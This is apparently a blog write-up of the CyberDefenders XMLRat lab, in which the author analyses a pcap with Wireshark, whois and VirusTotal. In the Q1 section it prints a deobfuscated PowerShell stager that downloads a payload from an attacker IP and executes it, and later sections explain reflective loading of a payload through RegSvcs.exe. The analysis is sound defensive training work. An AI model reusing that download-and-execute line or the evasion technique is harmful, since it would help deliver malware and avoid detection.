---
layout: single
title: Cyberdefenders - XMLRat Lab
excerpt: Network traffic analysis to identify malware delivery and analyze execution malware techniques. 
date: 2025-06-24
classes: wide
header:
  teaser: ../assets/images/sherlock-bumbleebe/
  teaser_home_page: true
  icon: ../assets/images/logo-icon.svg
categories:
   - cyberdefenders
   - dfir
   - malware analysis
tags:
   - wireshark 
   - bash 
   - virustotal 
   - hash
---

For this lab we are provided with only a .pcap file, so we can quickly move on to the questions.

-----

<h3 style="color: #0d6efd;"> Q1. The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed? </h3>

The first step I took was to apply an http filter in Wireshark. I observed two downloads events in the results. By followiing the TCP stream for the first download, I obtained this output. 

![](../assets/images/cyber-xrat/1.png)

Deobfuscating the code with the help of GTP revealed the following behavior: 

```bash 
[BYTe[]];
$A123='IeX(NeW-OBJeCT NeT.W';
$B456='eBCLIeNT).DOWNLO';
[BYTe[]];
$C789='VAN(''http://45.126.209.4:222/mdm.jpg'')'.RePLACe('VAN' ,'ADSTRING');
[BYTe[]];
IeX($A123+$B456+$C789)
```

IEX(...) (short for Invoke-Expression) takes that downloaded text and executes it directly in memory, which is likely not a genuine JPG but rather a PowerShell script. 

-----

<h3 style="color: #0d6efd;"> Q2. Which hosting provider owns the associated IP address? </h3>

Applying a `whois` on the ip found in the previous question. 

```bash 
┌──(kali㉿kali)-[~/blue-labs/rat]
└─$ whois 45.126.209.4
% [whois.apnic.net]
% Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html

% Information related to '45.126.208.0 - 45.126.211.255'

% Abuse contact for '45.126.208.0 - 45.126.211.255' is 'abuse@reliablesite.net'

inetnum:        45.126.208.0 - 45.126.211.255
netname:        RELIABLESITE-AP
descr:          ReliableSite.Net LLC
```

In the same way, we can identify the hosting provider with [this site](https://hostingchecker.com/)

-----

<h3 style="color: #0d6efd;"> Q3. By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable? </h3>

While analyzing `mdm.jpg` by following it's TCP stream in wireshark, we can see something that looks a obfuscated string, hexadecimal in this case. The variable with this sring is `$hexString_bbb`, and analyzing the code, this variable looks like a malicious payload which is reconstructed directly in memory rather than writing it to disk. 

![](../assets/images/cyber-xrat/2.png)

By copying that hex string into a file(e.g. payload.hex), removing all underscores(" _ "), converting the resulting plain hex into raw bytes, and then computing its sha256 hash. I used the following one-liner:

```bash 
tr -d '_' < payload.hex | xxd -r -p | sha256sum
```

-----

<h3 style="color: #0d6efd;"> Q4. What is the malware family label based on Alibaba? </h3>

By copying the hash obtained in the previous question and submitting it to VirusTotal, we can answer the question.

![](../assets/images/cyber-xrat)

----

<h3 style="color: #0d6efd;"> Q5. What is the timestamp of the malware's creation? </h3>

By reviewing the Details section in the VirusTotal report, we can gather more information about the file.

-----

<h3 style="color: #0d6efd;"> Q6. Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path. </h3>

By reviewing the TPC stream I can see the following: 

![](../assets/images/cyber-xrat/4.png)

The malware leverages `RegSvcs.exe`, a legitimate Microsoft-signes utility located in `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`. This executable is part of the .NET framework and is normally used to register .NET assemblies as COM+ applications. COM+ (Component Object Plus) is a Microsoft technology designed to manage object reuse(similar to DLLs), inter-process communication, transaction handling, and more. 

In this case, the malware does not exploit a vulnerability in `RegSvcs.exe`. Instead, it uses it as trusted host process to execute its payload reflectively in memory. Here's how it works: 

1. A hexadecimal-encoded payload ($hexString_pe) is parsed and converted into a raw byte array. 
2. This array is loaded into memory using `[Reflection.Assembly]::Load()`, producing an in-memory .NET assembly.

3. Within this assembly, the malware identifies and invokes a custom class(e.g., NewPE2.PE) and method(Execute). 
4. The `Execute` method-defined by the attacker inside the malicious assembly receives two arguments: 
 - A path to `RegSvcs.exe`
 - A second payload (e.g. `hexString_bbb`), also loaded as a byte array. 

The role of `RegSvcs.exe` in this context is to serve as a host process for executing the second-stage payload within a trusted enviroment. Because it is a signed, legitimate system binary, this helps the malware bypass traditional signature-based detection and reduces suspicious during runtime. 

This technique is know as `Reflecting Code Loading`, which is a technique were code—often a compiled executable or libary is loaded direcly into memory an execues, without ever being written to disk or formally registered with the operating system as a running process or module.

-----

<h3 style="color: #0d6efd;"> Q7. The script is designed to drop several files. List the names of the files dropped by the script. </h3>

By reviewing the analysis of `mdm.jpg` in VirusTotal: 

![](../assets/images/cyber-xrat/5.png)
